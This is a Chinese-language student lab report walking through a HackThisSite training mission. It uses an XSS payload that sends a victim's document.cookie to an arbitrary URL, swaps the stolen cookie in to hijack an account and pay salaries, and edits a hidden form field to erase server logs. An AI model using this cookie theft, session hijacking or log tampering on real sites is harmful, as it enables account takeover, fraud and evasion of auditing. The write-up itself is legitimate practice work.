網路安全第五次報告!
===
### Secret Sharing
#### 第2組 1051433 葛東昇

## 問題

From:

Message: Hey man,
I've heard you're good at hacking, and on the right side of things. So I came looking for you. I really need help, you see, my boss has stopped paying our salaries and I'm going to miss my rent! Please help me get my money, you can reach the site at Crappy Soft. They have an online payment system, but only he can use it. Maybe you can get into his account somehow, but for now you can use mine:

Username: r-conner@crappysoft.com
Password: ilovemywork

Thanks man, good luck.

## 問題-中文簡述

有人在找一個駭客，希望那個駭客能夠駭進公司的網站把薪水付給他，第一次進去公司的網站可以用他的帳號登進去。

## 解題流程
### Step 1
- 先點進題目中所提到的[website](http://www.hackthissite.org/missions/realistic/9/)，可以看到首頁。

![](https://imgur.com/jgMHHx5.png)

### Step 2
- 登入，完成後會進來這邊

![](https://imgur.com/NMgkH8l.png)

- 點選左邊的Pay Salaries之後發現沒有權限

![](https://imgur.com/aL4QT9o.png)


### Step 3
- 點選左邊的Private Message，並且使用XSS Attack手法取得老闆的cookie。
code : javascript:void(window.location=隨便一個網址+document.cookie)
![](https://imgur.com/suDHOEq.png)
![](https://imgur.com/ThwNXbS.png)

### Step 4
- 利用chrome外掛擴充功能，去更改網站的cookie內容，然後就發現能付薪水了。
點擊Pay之後，會發現一段提示文字告訴你要清除紀錄

![](https://imgur.com/DLV2nYy.png)
![](https://imgur.com/K9SOFHH.png)
![](https://imgur.com/1ukOFTP.png)

### Step 5
- 開始找尋log存放的路徑，發現如果點擊左邊的Demo會有一個可以點擊下載東西的路徑，
網址是[website](https://www.hackthissite.org/missions/realistic/9/files/downloads/CrappyDemo.exe.zip)
![](https://imgur.com/zbgFXcV.png)
- 砍掉後面的檔名會發現進到一個地方，並開始找尋log找到的地方，最後找到log存放的地方
網址是[website](https://www.hackthissite.org/missions/realistic/9/files/logs/logs.txt)
![](https://imgur.com/2avKq6x.png)
![](https://imgur.com/cL9rRm1.png)
![](https://imgur.com/HJon1vu.png)
![](https://imgur.com/uSPTn2Y.png)

### Step 6
- 再來是要解決如何清除log.txt裡面的內容，發現點擊左邊功能表的Mailing List，有一段關鍵的話，(Note: This adds your email to the list, and at the same time, checks the list for anything without the '@' character and deletes it.)
也就是說只要把不含@的文字送過去也可以把log清除掉
![](https://imgur.com/ALLFopK.png)

- 那段程式碼如下：
```Html
<div id="body">
 Here you can subscribe to our software newsletter.<br />
      The newest update's and changelog's will automaticly be mailed to you!<br />
      <br />
      <br />
      Enter your email address here:<br />

      (Note: This adds your email to the list, and at the same time, checks the list for anything without the '@' character and deletes it.)<br />
      <br />
      <form action="subscribemailing.php" method="post">
       <input type="hidden" name="strFilename" value="./files/mailinglist/addresses.txt">
       <input type="text" name="strEmailAddress" value="you@somedomain.com">
       <br />
       <input type="submit" value="Subscribe!">
      </form></div>
<div id="footer">&nbsp;</div>
</div>
```

- 將 input type="hidden" name="strFilename" value="./files/mailinglist/addresses.txt"裡的value改成./files/logs/logs.txt

- 並將input type="text" name="strEmailAddress" value="you@somedomain.com
的value改成一個沒有@的文字

- 最後在隨便亂打一個值並subsribe出去

![](https://imgur.com/M9LJwQb.png)



### 成功

![](https://imgur.com/Ly36nF3.png)

        


